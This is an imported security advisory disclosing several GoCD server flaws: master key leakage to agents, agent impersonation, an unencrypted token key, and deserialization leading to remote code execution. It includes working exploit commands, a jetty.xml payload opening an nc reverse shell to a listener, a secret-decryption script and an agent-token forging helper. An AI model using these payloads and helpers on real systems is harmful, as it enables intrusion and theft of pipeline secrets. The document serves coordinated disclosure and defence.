---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-01-12_gocd-multiple-vulnerabilities.md
original_filename: 2021-01-12_gocd-multiple-vulnerabilities.md
title: GoCD Multiple Vulnerabilities
category: documents
detected_topics:
- access-control
- command-injection
- supply-chain
- oauth
- sso
- jwt
tags:
- imported
- documents
- access-control
- command-injection
- supply-chain
- oauth
- sso
- jwt
language: en
raw_sha256: 366897c75e9eaef1a069265594713590f454b7890a64f15638b39ed5a4817cb9
text_sha256: bca243336a8258f6d305084f448d9a379054f07f0e2c32561a04b8e92b09a589
ingested_at: '2026-06-28T07:32:04Z'
sensitivity: unknown
redactions_applied: true
---

# GoCD Multiple Vulnerabilities

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-01-12_gocd-multiple-vulnerabilities.md
- Source Type: markdown
- Detected Topics: access-control, command-injection, supply-chain, oauth, sso, jwt
- Ingested At: 2026-06-28T07:32:04Z
- Redactions Applied: True
- Raw SHA256: `366897c75e9eaef1a069265594713590f454b7890a64f15638b39ed5a4817cb9`
- Text SHA256: `bca243336a8258f6d305084f448d9a379054f07f0e2c32561a04b8e92b09a589`


## Content

---
title: "GoCD Multiple Vulnerabilities"
url: "https://pulsesecurity.co.nz/advisories/GOCD-Multiple-Vulnerabilities"
final_url: "https://pulsesecurity.co.nz/advisories/GOCD-Multiple-Vulnerabilities"
authors: ["Denis Andzakovic"]
programs: ["GoCD"]
bugs: ["RCE", "Information disclosure", "Insecure deserialization", "Security code review"]
publication_date: "2021-01-12"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4002
---

# GoCD Multiple Vulnerabilities

by Denis Andzakovic

### Recent Releases

####  advisories [See all](/advisories)

  * 12/6/24  [CodiMD Unauthorised Image Access](/advisories/codimd-missing-image-access-controls)
  * 5/6/24  [Slack Web Hook Message Injection Advisory](/advisories/slack-message-injection)
  * 18/3/24  [Bypassing USBGuard on Linux](/advisories/usbguard-bypass)
  * 20/9/23  [HDF5 - Multiple Memory Corruption Vulnerabilities](/advisories/hdf5-memory-corruption)

* * *

####  articles [See all](/articles)

  * 26/5/26  [Stealing Browser Sessions with DevTools](/articles/stealing_browser_sessions_with_devtools)
  * 22/5/26  [Timeboxed Penetration Testing - Pulse Security’s Approach](/articles/timeboxed-penetration-tests)
  * 13/2/26  [Harvesting Intune Device Scripts Without Tools](/articles/intune-device-scripts)
  * 14/1/26  [Sensitive data in URLs: Why private links aren’t private anymore due to threat intelligence feeds](/articles/unguessable_url_issues)

Jan 12 2021

Multiple vulnerabilities were discovered within GoCD. These issues allowed for retrieval of the master secret key from a compromised agent, impersonation of arbitrary agents and remote code execution through deserialization. All vulnerabilities in this advisory are presented from the perspective of an attacker who has either compromised an existing GoCD agent (or its network traffic) or has access to view the GoCD configuration XML (either through the web ui or via a configuration backup).

**Date Released:** 12/01/2021  
**Author:** Denis Andzakovic  
**Vendor Website:** <https://www.gocd.org/>  
**Affected Software:** GoCD Server < v20.11.0-12419

## Background

### Secret variables

GoCD supports secret variables, which are encrypted with AES. The master encryption key is stored within the `cipher.aes` file, located in `/godata/config/cipher.aes` in the `gocd/gocd-server` docker image. This file is considered extremely sensitive. Knowledge of the files contents allows an attacker to decrypt any secret variable within the GoCD installation. These secret variables are generally stored within GoCD pipeline configuration and within source repositories used by GoCD. The decrypter script included at the end of this advisory can be used to decrypt GoCD secure variables.

### GoCD Agents

Agents contact the GoCD server over HTTP (or HTTPS if configured) and poll for work. When a pipeline is run, the pipeline is scheduled to an available agent and the data transmitted on the next request for work from the scheduled agent.

GoCD agents contacted the GoCD server using Java serialized objects and Spring RemoteInvocation. When work was available, a serialized object was returned from the server containing the pipeline information and jobs to run.

An unauthenticated attacker may register a new agent, however this agent will receive no work until it is approved in the admin interface. If an attacker determines the automatic registration token, they may auto-provision an agent.

## Details

### Master Encryption Key Leakage

The GoCD Server unintentionally leaked the master encryption key for secure variables to every configured agent. An attacker who has compromised an agent, its network transport or can register a new agent (either with an auto-registration token or by convincing an existing user to approve a new agent in the web ui) can leverage this behavior to obtain the master encryption key.

When a job is available for a GoCD agent, the object returned from the GoCD server includes a `com.thoughtworks.go.security.GoCipher` object which exposes the `cipher.aes` master key. An attacker with access to any agent, or network traffic where HTTPS is not configured between the agent and the server, may retrieve this master key and decrypt any GoCD secret variable.

The following figure shows a request for work, sent from a GoCD agent to a GoCD server:
  
  
  POST /go/remoting/remoteBuildRepository HTTP/1.1
  Host: 172.17.0.1:8153
  User-Agent: Apache-HttpClient/4.5.6 (Java/15.0.1)
  Content-Length: 1271
  Accept-Encoding: gzip,deflate
  Authorization: AA/yJekGeSBNDY8zraj1rESs9PYu/xBfH8m2JtTRILQ=
  Content-Type: application/x-java-serialized-object
  Cookie: JSESSIONID=node01ew5k4ka76nim17km1w6ajnfge71.node0
  Proxy-Connection: Keep-Alive
  X-Agent-Guid: 90505c1c-5e8c-4516-ab81-bcb1d6b37277
  
  ��sr5org.springframework.remoting.support.RemoteInvocation_l���
  
  [	argumentst[Ljava/lang/Object;L
  ...SNIP...
  172.17.0.3t$90505c1c-5e8c-4516-ab81-bcb1d6b37277t/got
  debian 9.13 ~r-com.thoughtworks.go.domain.AgentRuntimeStatusxrjava.lang.EnumxptIdlesrjava.lang.Long;��̏#�Jvaluexrjava.lang.Number���
  ���xp���ptgetWorkur[Ljava.lang.Class;�׮��Z�xpvq
  

When work is available, the server responds with a Java serialized object that contains a `com.thoughtworks.go.security.GoCipher` sub-object. The follow response shows the issue:
  
  
  HTTP/1.1 200 OK
  Content-Length: 7341
  Content-Type: application/x-java-serialized-object
  Date: Fri, 04 Dec 2020 03:00:30 GMT
  Expires: Thu, 01 Jan 1970 00:00:00 GMT
  Set-Cookie: JSESSIONID=node01up0azd0t8b1lapz7gixn0ekw72.node0; Path=/go; Expires=Fri, 18-Dec-2020 03:00:30 GMT; Max-Age=1209600; HttpOnly
  X-Content-Type-Options: nosniff
  X-Frame-Options: SAMEORIGIN
  X-Ua-Compatible: chrome=1
  X-Xss-Protection: 1; mode=block
  
  ...SNIP...
  GitMaterialturlt https://github.com/xyproto/xeyestbranchq~uxq~�pppsr%com.thoughtworks.go.security.GoCipher���ȝxL
  aesEncryptert(Lcom/thoughtworks/go/security/Encrypter;xpsr)com.thoughtworks.go.security.AESEncrypter�����N�nLcipherProvidert0Lcom/thoughtworks/go/security/AESCipherProvider;xpsr.com.thoughtworks.go.security.AESCipherProvider[�$}�{?L
  cipherFileq~
  [keyt[Bxpsq~tconfig/cipher.aesw/xur[B��T�xp��"T�u����؉YI�sq~Fwxpq~upsr,com.thoughtworks.go.util.command.UrlArgument�G�p�Lurlq~xr0com.thoughtworks.go.util.command.CommandArgument,�Z;Bc��xpq~�sr2com.thoughtworks.go.domain.materials.Modifications�ɹ��vxq~wsr1com.thoughtworks.go.domain.materials.ModificationT��
  ...SNIP...
  

The response object was processed with [SerializationDumper](https://github.com/NickstaDB/SerializationDumper) and the `cipher.aes` key retrieved, as shown below:
  
  
  STREAM_MAGIC - 0xac ed
  STREAM_VERSION - 0x00 05
  Contents
  TC_OBJECT - 0x73
  TC_CLASSDESC - 0x72
  className
  Length - 59 - 0x00 3b
  Value - org.springframework.remoting.support.RemoteInvocationResult - 0x6f72672e737072696e676672616d65776f726b2e72656d6f74696e672e737570706f72742e5265***REDACTED-SUSPECT-TOKEN***  serialVersionUID - 0x1d ad ac 92 99 49 4a 6d
  newHandle 0x00 7e 00 00
  classDescFlags - 0x02 - SC_SERIALIZABLE
  fieldCount - 2 - 0x00 02
  Fields
  0:
  Object - L - 0x4c
  fieldName
  Length - 9 - 0x00 09
  Value - exception - 0x657863657074696f6e
  className1
  TC_STRING - 0x74
  newHandle 0x00 7e 00 01
  Length - 21 - 0x00 15
  Value - Ljava/lang/Throwable; - 0x4c***REDACTED-SUSPECT-TOKEN***  ...SNIP...
  classdata
  com.thoughtworks.go.security.GoCipher
  values
  aesEncrypter
  (object)
  TC_OBJECT - 0x73
  TC_CLASSDESC - 0x72
  className
  Length - 41 - 0x00 29
  Value - com.thoughtworks.go.security.AESEncrypter - 0x636f6d2e74686f75
  676874776f726b732e676f2e73***REDACTED-SUSPECT-TOKEN***  serialVersionUID - 0x8c 91 ee d2 c1 4e df 6e
  ...SNIP...
  key
  (array)
  TC_ARRAY - 0x75
  TC_CLASSDESC - 0x72
  className
  Length - 2 - 0x00 02
  Value - [B - 0x5b42
  serialVersionUID - 0xac f3 17 f8 06 08 54 e0
  newHandle 0x00 7e 00 ad
  classDescFlags - 0x02 - SC_SERIALIZABLE
  fieldCount - 0 - 0x00 00
  classAnnotations
  TC_ENDBLOCKDATA - 0x78
  superClassDesc
  TC_NULL - 0x70
  newHandle 0x00 7e 00 ae
  Array size - 16 - 0x00 00 00 10
  Values
  Index 0:
  (byte)-14 - 0xf2
  Index 1:
  (byte)-24 - 0xe8
  Index 2:
  (byte)34 (ASCII: ") - 0x22
  Index 3:
  (byte)84 (ASCII: T) - 0x54
  Index 4:
  (byte)-93 - 0xa3
  Index 5:
  (byte)117 (ASCII: u) - 0x75
  Index 6:
  (byte)-100 - 0x9c
  Index 7:
  (byte)-9 - 0xf7
  Index 8:
  (byte)-47 - 0xd1
  Index 9:
  (byte)-57 - 0xc7
  Index 10:
  (byte)-40 - 0xd8
  Index 11:
  (byte)-119 - 0x89
  Index 12:
  (byte)89 (ASCII: Y) - 0x59
  Index 13:
  (byte)73 (ASCII: I) - 0x49
  Index 14:
  (byte)-116 - 0x8c
  Index 15:
  (byte)27 - 0x1b
  

The `key` array above corresponds the the `cipher.aes` key, as shown below. In this case, the key was `0xf2 0xe8 0x22 0x54 0xa3 0x75 0x9c 0xf7 0xd1 0xc7 0xd8 0x89 0x59 0x49 0x8c 0x1b`
  
  
  /var/lib/docker/overlay2/3e0ae50da594f8f178e66c4ece50d26854b2913c96ddc7c7ab643b4007b0709d/merged/godata/config# cat cipher.aes ; echo
  ***REDACTED-SUSPECT-TOKEN***This information was exposed to agents due to the `goCipher` object included under the `com.thoughtworks.go.config.materials.ScmMaterial` class instance sent to the agent:
  
  
  common/src/main/java/com/thoughtworks/go/remote/work/BuildWork.java
  42 /**
  43  * @understands a source control repository and its configuration
  44  */
  45 public abstract class ScmMaterial extends AbstractMaterial implements SecretParamAware {
  46 
  47  public static final String GO_REVISION = "GO_REVISION";
  48  public static final String GO_TO_REVISION = "GO_TO_REVISION";
  49  public static final String GO_FROM_REVISION = "GO_FROM_REVISION";
  50  public static final String GO_MATERIAL_URL = "GO_MATERIAL_URL";
  51  protected final GoCipher goCipher;
  
  

Secure variables used by the GoCD agents are decrypted server side and shipped to the agents in clear-text, thus there is no practical reason to expose the `com.thoughtworks.go.security.GoCipher` object to the agents:
  
  
  com.thoughtworks.go.util.command.EnvironmentVariableContext$EnvironmentVariable
  values
  secure
  (boolean)true - 0x01
  name
  (object)
  TC_STRING - 0x74
  newHandle 0x00 7e 00 7b
  Length - 9 - 0x00 09
  Value - securevar - 0x736563757265766172
  secretParams
  (object)
  TC_OBJECT - 0x73
  TC_REFERENCE - 0x71
  Handle - 8257606 - 0x00 7e 00 46
  newHandle 0x00 7e 00 7c
  classdata
  java.util.ArrayList
  values
  size
  (int)0 - 0x00 00 00 00
  objectAnnotation
  TC_BLOCKDATA - 0x77
  Length - 4 - 0x04
  Contents - 0x00000000
  TC_ENDBLOCKDATA - 0x78
  com.thoughtworks.go.config.SecretParams
  values
  value
  (object)
  TC_STRING - 0x74
  newHandle 0x00 7e 00 7d
  Length - 27 - 0x00 1b
  Value - YouShouldNotSeeThisSoSecure - 0x596f7553686f75***REDACTED-SUSPECT-TOKEN***  TC_ENDBLOCKDATA - 0x78
  

### Agent Insecure Access Control

Agents were authenticated via an HMAC calculated using the agent’s GUID and the `tokenGenerationKey` configuration variable. No access controls were applied to ensure that the agent token is valid for the agent `uuid` supplied in the `/go/remoting/remoteBuildRepository` request calling the `getWork` method via Spring’s RemoteInvocation. This allowed an attacker who has compromised a legitimate agent to request jobs for any other agent deployed within the GoCD environment. The following figure shows the authentication logic for the agent requests:
  
  
  server/src/main/java/com/thoughtworks/go/server/newsecurity/filters/AgentAuthenticationFilter.java
  68  private void tokenBasedFilter(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain) throws IOException, ServletException {
  69  String uuid = request.getHeader("X-Agent-GUID");
  70  String token = request.getHeader("Authorization");
  ...SNIP...
  84  AuthenticationToken<?> authenticationToken = SessionUtils.getAuthenticationToken(request);
  85  AgentToken agentToken = new AgentToken(uuid, token);
  86 
  87  if (isAuthenticated(agentToken, authenticationToken)) {
  88  LOGGER.debug("Agent is already authenticated");
  89  } else {
  90  if (!hmacOf(uuid).equals(token)) {
  91  LOGGER.debug("Denying access, agent with uuid '{}' submitted bad token.", uuid);
  92  response.setStatus(403);
  93  return;
  94  }
  95 
  96  GoUserPrinciple agentUser = new GoUserPrinciple("_go_agent_" + uuid, "", GoAuthority.ROLE_AGENT.asAuthority());
  97  AuthenticationToken<AgentToken> authentication = new AuthenticationToken<>(agentUser, agentToken, null, clock.currentTimeMillis(), null);
  98 
  99  LOGGER.debug("Adding agent user to current session and proceeding.");
  100  SessionUtils.setAuthenticationTokenAfterRecreatingSession(authentication, request);
  101  }
  102 
  103  filterChain.doFilter(request, response);
  104  }
  105 
  106  /*Fixes:#8427 HMAC generation is not thread safe, if multiple agents try to authenticate at the same time the hmac
  107  generated using the Agent UUID would not match the actual token.*/
  108  synchronized String hmacOf(String string) {
  109  return encodeBase64String(hmac().doFinal(string.getBytes()));
  110  }
  ...SNIP...
  118  private Mac hmac() {
  119  if (mac == null) {
  120  try {
  121  mac = Mac.getInstance("HmacSHA256");
  122  SecretKeySpec secretKey = new SecretKeySpec(goConfigService.serverConfig().getTokenGenerationKey().getBytes(), "HmacSHA256");
  123  mac.init(secretKey);
  124  } catch (NoSuchAlgorithmException | InvalidKeyException e) {
  125  throw new RuntimeException(e);
  126  }
  127  }
  128  return mac;
  129  }
  

The `uuid` used to calculate the token was taken from the `X-Agent-Guid` header, however GoCD later used the `uuid` parameter passed in the Java serialized object to determine the agent `uuid`. As a result, an attacker could supply any agent `uuid` in the serialized object and obtain work intended for other agents. This could include sensitive information, such as credentials. Pulse Security leveraged this vulnerability in a recent engagement to gain access to sensitive production data after obtaining initial access as an unrelated agent.
  
  
  server/src/main/java/com/thoughtworks/go/server/messaging/BuildRepositoryMessageProducer.java
  47  @Override
  48  public Work getWork(AgentRuntimeInfo runtimeInfo) {
  49  long startTime = System.currentTimeMillis();
  50 
  51  Work work = workAssignments.getWork(runtimeInfo);
  52 
  53  workAssignmentPerformanceLogger.retrievedWorkForAgent(runtimeInfo, work, startTime, System.currentTimeMillis());
  54  return work;
  55  }
  
  server/src/main/java/com/thoughtworks/go/server/messaging/scheduling/WorkAssignments.java
  44  public Work getWork(AgentRuntimeInfo runtimeInfo) {
  45  AgentIdentifier agent = runtimeInfo.getIdentifier();
  46  synchronized (agentMutex(agent)) {
  47  Work work = assignments.get(agent);
  48  if (work == null) {
  49  assignments.put(agent, NO_WORK);
  50  idleAgentsTopic.post(new IdleAgentMessage(runtimeInfo));
  51  return NO_WORK;
  52  }
  53 
  54  if (work instanceof NoWork) {
  55  return work;
  56  }
  57 
  58  return assignments.remove(agent);
  59  }
  60  }
  
  

### Missing Encryption for Agent Access Token Secret

GoCD does not use its secret encryption routines to defend the agent token generation key. This information is available in the configuration file and exposed via the web interface. The following snippet shows the relevant section from the `cruise-config.xml` file:
  
  
  <?xml version="1.0" encoding="utf-8"?>
  <cruise xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="cruise-config.xsd" schemaVersion="138">
  <server agentAutoRegisterKey="d3abbd45-f476-400c-8713-433a1802e9f9" webhookSecret="b20ad408-5145-435a-9f91-e755a8a87e0f" commandRepositoryLocation="default" serverId="2d69a708-7d47-475f-8e3a-97c35f137511" tokenGenerationKey="47169363-6451-4273-827f-bf3ae05c9c49">
  <backup emailOnSuccess="true" emailOnFailure="true" />
  <artifacts>
  <artifactsDir>artifacts</artifactsDir>
  </artifacts>
  

This information is also exposed via the admin interface:

[![gocd config](/assets/images/releases/gocd-config.png)](/assets/images/releases/gocd-config.png)

Thoughtworks have opted to leave this functionality as-is, and as such this vulnerability is still present in the current versions of GoCD.

### Arbitrary Deserialization - Remote Code Execution

The Spring RemoteInvocation endpoint exposed for agent communication allowed deserialization of arbitrary java objects, and subsequent remote code execution. Exploitation required agent-level authentication, thus an attacker would need to either compromise an existing agent, its network communication or register a new agent to practically exploit this vulnerability.

The following figure shows a proof-of-concept exploit using [ysoserial](https://github.com/frohoff/ysoserial) to generate a payload which, when deserialized, causes an arbitrary DNS request.
  
  
  ~/tools/ysoserial$ java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://testdomain.pulsesecurity.co.nz > urldns.raw
  ~/tools/ysoserial$ curl -v 172.17.0.1:8153/go/remoting/remoteBuildRepository -H 'Authorization: AA/yJekGeSBNDY8zraj1rESs9PYu/xBfH8m2JtTRILQ=' -H 'X-Agent-Guid: 90505c1c-5e8c-4516-ab81-bcb1d6b37277' -H 'Content-Type: application/x-java-serialized-object' -X POST --data-binary @urldns.raw --output -
  Note: Unnecessary use of -X or --request, POST is already inferred.
  * Expire in 0 ms for 6 (transfer 0x564cc2938f50)
  *  Trying 172.17.0.1...
  * TCP_NODELAY set
  * Expire in 200 ms for 4 (transfer 0x564cc2938f50)
  * Connected to 172.17.0.1 (172.17.0.1) port 8153 (#0)
  > POST /go/remoting/remoteBuildRepository HTTP/1.1
  > Host: 172.17.0.1:8153
  > User-Agent: curl/7.64.0
  > Accept: */*
  > Authorization: AA/yJekGeSBNDY8zraj1rESs9PYu/xBfH8m2JtTRILQ=
  > X-Agent-Guid: 90505c1c-5e8c-4516-ab81-bcb1d6b37277
  > Content-Type: application/x-java-serialized-object
  > Content-Length: 311
  > 
  * upload completely sent off: 311 out of 311 bytes
  < HTTP/1.1 500 Server Error
  < X-XSS-Protection: 1; mode=block
  < X-Content-Type-Options: nosniff
  < X-Frame-Options: SAMEORIGIN
  < X-UA-Compatible: chrome=1
  < Set-Cookie: JSESSIONID=node0uemnq3xqronu1kfla5zqe5fv13.node0; Path=/go; Expires=Sun, 20-Dec-2020 12:00:56 GMT; Max-Age=1209600; HttpOnly
  < Cache-Control: must-revalidate,no-cache,no-store
  < Content-Type: text/html;charset=iso-8859-1
  < Content-Length: 1074
  < Connection: close
  ...SNIP...
  

A running packet capture confirmed the resulting DNS request, indicating successful deserialization:
  
  
  $ sudo tcpdump -X -n -i docker0 'port 53'
  tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
  listening on docker0, link-type EN10MB (Ethernet), capture size 262144 bytes
  01:00:56.398839 IP 172.17.0.2.41287 > 192.168.122.1.53: 22794+ A? testdomain.pulsesecurity.co.nz. (48)
  0x0000:  4500 004c b9e3 4000 4011 9a00 ac11 0002  E..L..@.@.......
  0x0010:  c0a8 7a01 a147 0035 0038 e706 590a 0100  ..z..G.5.8..Y...
  0x0020:  0001 0000 0000 0000 0a74 6573 7464 6f6d  .........testdom
  0x0030:  6169 6e0d 7075 6c73 6573 6563 7572 6974  ain.pulsesecurit
  0x0040:  7902 636f 026e 7a00 0001 0001  y.co.nz.....
  01:00:59.187087 IP 192.168.122.1.53 > 172.17.0.2.41287: 22794 NXDomain 0/0/0 (48)
  0x0000:  4500 004c c01f 4000 3f11 94c4 c0a8 7a01  E..L..@.?.....z.
  0x0010:  ac11 0002 0035 a147 0038 99fc 590a 8183  .....5.G.8..Y...
  0x0020:  0001 0000 0000 0000 0a74 6573 7464 6f6d  .........testdom
  0x0030:  6169 6e0d 7075 6c73 6573 6563 7572 6974  ain.pulsesecurit
  0x0040:  7902 636f 026e 7a00 0001 0001  y.co.nz.....
  

Existing `ysoserial` gadgets were not applicable to GoCD, so I’ve put together two additional gadgets to exploit this vulnerability. These gadget leverage `Aspect4J` to upload an arbitrary file and then force a server restart by reading from `/dev/random`. The gadgets can be found [here](https://gist.github.com/denandz/a806b53e36034a08e0e2d4001fe416eb).

The following exploit works by uploading a malicious `jetty.xml` file and forcing a server restart. The original `jetty.xml` can be found [here](https://github.com/gocd/gocd/blob/master/server/config/jetty.xml).

First, the `jetty.xml` file is modified with a malicious `<call>`:
  
  
  :~$ cat jetty.xml 
  <?xml version="1.0"?>
  <!--
  ...SNIP...
  </Get>
  
  <Call class="java.lang.Runtime" name="getRuntime">
  <Call name="exec">
  <Arg>nc 172.17.0.1 8000 -e /bin/sh</Arg>
  </Call>
  </Call>
  </Configure>
  

This file is then used with the `Aspect4J` upload gadget:
  
  
  ~/tools/ysoserial-custom$ java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar AspectJWeaverFileUpload1 '/home/doi/jetty.xml;/godata/config/jetty.xml' |
  curl -v 172.17.0.1:8153/go/remoting/remoteBuildRepository \
  -H 'Authorization: AA/yJekGeSBNDY8zraj1rESs9PYu/xBfH8m2JtTRILQ=' \
  -H 'X-Agent-Guid: 90505c1c-5e8c-4516-ab81-bcb1d6b37277' \
  -H 'Content-Type: application/x-java-serialized-object' \
  --data-binary @- --output -
  * Expire in 0 ms for 6 (transfer 0x557bc32e5f90)
  *  Trying 172.17.0.1...
  * TCP_NODELAY set
  * Expire in 200 ms for 4 (transfer 0x557bc32e5f90)
  * Connected to 172.17.0.1 (172.17.0.1) port 8153 (#0)
  > POST /go/remoting/remoteBuildRepository HTTP/1.1
  > Host: 172.17.0.1:8153
  > User-Agent: curl/7.64.0
  > Accept: */*
  > Authorization: AA/yJekGeSBNDY8zraj1rESs9PYu/xBfH8m2JtTRILQ=
  > X-Agent-Guid: 90505c1c-5e8c-4516-ab81-bcb1d6b37277
  > Content-Type: application/x-java-serialized-object
  > Content-Length: 5123
  > Expect: 100-continue
  > 
  * Expire in 1000 ms for 0 (transfer 0x557bc32e5f90)
  < HTTP/1.1 100 Continue
  * We are completely uploaded and fine
  < HTTP/1.1 500 Server Error
  < X-XSS-Protection: 1; mode=block
  < X-Content-Type-Options: nosniff
  < X-Frame-Options: SAMEORIGIN
  < X-UA-Compatible: chrome=1
  < Set-Cookie: JSESSIONID=node01wukwbugv3ehsq0kv8eh729q715.node0; Path=/go; Expires=Mon, 25-Jan-2021 05:58:39 GMT; Max-Age=1209600; HttpOnly
  < Cache-Control: must-revalidate,no-cache,no-store
  < Content-Type: text/html;charset=iso-8859-1
  < Content-Length: 1074
  < Connection: close
  < 
  
  ...SNIP...
  

A listener is started and the GoCD server forced to crash by reading `/dev/random`. The wrapper restarts the process on crash:
  
  
  java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar AspectJWeaverFileRead1 '/dev/random' |
  curl -v 172.17.0.1:8153/go/remoting/remoteBuildRepository \
  -H 'Authorization: AA/yJekGeSBNDY8zraj1rESs9PYu/xBfH8m2JtTRILQ=' \
  -H 'X-Agent-Guid: 90505c1c-5e8c-4516-ab81-bcb1d6b37277' \
  -H 'Content-Type: application/x-java-serialized-object' \
  --data-binary @- --output -
  
  
  
  :~$ nc -vv -k -l -p 8000
  listening on [any] 8000 ...
  172.17.0.2: inverse host lookup failed: Unknown host
  connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 41897
  id
  uid=1000(go) gid=0(root) groups=0(root)
  pwd  
  /go-working-dir
  ls -la
  total 112552
  drwxrwxr-x  1 go  root  4096 Jan 11 06:00 .
  drwxr-xr-x  1 root  root  4096 Dec  4 00:11 ..
  lrwxrwxrwx  1 go  root  14 Dec  4 00:11 addons -> /godata/addons
  lrwxrwxrwx  1 go  root  17 Dec  4 00:11 artifacts -> /godata/artifacts
  lrwxrwxrwx  1 go  root  14 Dec  4 00:11 bin -> /go-server/bin
  lrwxrwxrwx  1 go  root  14 Dec  4 00:11 config -> /godata/config
  -rw-r--r--  1 go  root  114707011 Jan 11 06:00 cruise.war
  drwxr-xr-x  3 go  root  4096 Dec  4 02:56 data
  lrwxrwxrwx  1 go  root  10 Dec  4 00:11 db -> /godata/db
  drwxr-xr-x  9 go  root  4096 Jan 11 05:29 felix-cache
  lrwxrwxrwx  1 go  root  14 Dec  4 00:11 lib -> /go-server/lib
  lrwxrwxrwx  1 go  root  12 Dec  4 00:11 logs -> /godata/logs
  drwxr-xr-x  3 go  root  4096 Dec  4 02:56 pipelines
  lrwxrwxrwx  1 go  root  15 Dec  4 00:11 plugins -> /godata/plugins
  drwxr-xr-x  8 go  root  4096 Jan 11 05:29 plugins_work
  lrwxrwxrwx  1 go  root  14 Dec  4 00:11 run -> /go-server/run
  drwxr-xr-x  3 go  root  4096 Jan 11 06:00 work
  lrwxrwxrwx  1 go  root  18 Dec  4 00:11 wrapper -> /go-server/wrapper
  lrwxrwxrwx  1 go  root  25 Dec  4 00:11 wrapper-config -> /go-server/wrapper-config
  -rw-r--r--  1 go  root  511367 Jan 11 06:00 wrapper.log
  

And, ofcourse, the obligatory exploit gif:

[![gocd exploit](/assets/images/releases/gocd-exploit.gif)](/assets/images/releases/gocd-exploit.gif)

This vulnerability has been addressed by using JSON for agent communication instead and disabling Spring RemoteInvocation by default. Note, this can still be enabled which would re-introduce this vulnerability as detailed [here](https://github.com/gocd/gocd/pull/8929).

## Helper Scripts

### GoCD Secret Decryption

The following Golang script can be used to decrypt GoCD secret variables after obtaining the `cipher.aes` master key.
  
  
  package main
  
  import (
  "crypto/aes"
  "crypto/cipher"
  "encoding/base64"
  "encoding/hex"
  "fmt"
  "os"
  "strings"
  )
  
  func main() {
  keyString := os.Args[1]
  encrypted := os.Args[2]
  
  fmt.Println(keyString)
  key, err := hex.DecodeString(keyString)
  if err != nil {
  fmt.Println(err)
  return
  }
  
  s := strings.Split(encrypted, ":")
  if len(s) != 3 {
  fmt.Println("Insufficient parameters for secret variable. Should be aes:<base64 iv>:<base64 ciphertext>")
  return
  }
  
  header := s[0]
  if header != "AES" {
  fmt.Println("Secret variable should start with 'AES:'. Old GOCD secret maybe?")
  }
  
  fmt.Printf("%s %s %s\n", s[0], s[1], s[2])
  
  iv, err := base64.StdEncoding.DecodeString(s[1])
  if err != nil {
  fmt.Printf("Error decoding IV: %s \n", err)
  return
  }
  
  ciphertext, err := base64.StdEncoding.DecodeString(s[2])
  if err != nil {
  fmt.Printf("Error decoding Ciphertext: %s \n", err)
  return
  }
  
  out := decrypt(key, iv, ciphertext)
  fmt.Println(out)
  }
  
  func decrypt(key []byte, iv []byte, ciphertext []byte) string {
  fmt.Println("decrypting...")
  block, err := aes.NewCipher(key)
  if err != nil {
  panic(err)
  }
  if len(ciphertext) < aes.BlockSize {
  panic("ciphertext too short")
  }
  
  s := cipher.NewCBCDecrypter(block, iv)
  s.CryptBlocks(ciphertext, ciphertext)
  
  return fmt.Sprintf("%s", ciphertext)
  }
  

### GoCD Agent Key Generation

The following Java helper can be used to generate agent secrets after retrieving the `cruise-config.xml` and an agent identifier.
  
  
  import javax.crypto.Mac;
  import javax.crypto.spec.SecretKeySpec;
  import java.io.File;
  import java.io.IOException;
  import java.io.InputStream;
  import java.security.InvalidKeyException;
  import java.security.NoSuchAlgorithmException;
  import java.util.Arrays;
  import java.util.Base64;
  
  public class main {
  
  public static void main(String[] args) {
  System.out.println(token(args[0],args[1]));
  }
  
  private static String token(String uuid, String tokenGenerationKey) {
  try {
  Mac mac = Mac.getInstance("HmacSHA256");
  SecretKeySpec secretKey = new SecretKeySpec(tokenGenerationKey.getBytes(), "HmacSHA256");
  mac.init(secretKey);
  return Base64.getEncoder().encodeToString(mac.doFinal(uuid.getBytes()));
  } catch (NoSuchAlgorithmException | InvalidKeyException e) {
  throw new RuntimeException(e);
  }
  }
  }
  

## Timeline

07/12/2020 - Advisory sent to Thoughtworks.  
10/12/2020 - Fixes for the master key leakage [merged](https://github.com/gocd/gocd/pull/8857).  
23/12/2020 - Fixes for the remainder of the issues identified.  
11/01/2021 - Fixes confirmed.  
12/01/2021 - Advisory released.

## References

  * [GoCD: Authorize agents remoting by UUID](https://github.com/gocd/gocd/pull/8877)
  * [GoCD: Disable RMI endpoint by default but allow toggling](https://github.com/gocd/gocd/pull/8929)
  * [GoCD: Prevent gson serialization from serializing cipher-related instances](https://github.com/gocd/gocd/pull/8895)
  * [GoCD: SCMMaterial Changes](https://github.com/gocd/gocd/pull/8857)
  * [Vulnerability in GoCD - Java deserialization and Apache commons-collections](https://www.gocd.org/2015/11/09/deserialization-vulnerability-commons-collections/)
  * [ysoserial](https://github.com/frohoff/ysoserial)
  * [Serialization dumper](https://github.com/NickstaDB/SerializationDumper)
  * [Aspect4J file read and write deserialization gadgets](https://gist.github.com/denandz/a806b53e36034a08e0e2d4001fe416eb)

* * *

_Follow us on[LinkedIn](https://nz.linkedin.com/company/pulsesecurity)_

* * *
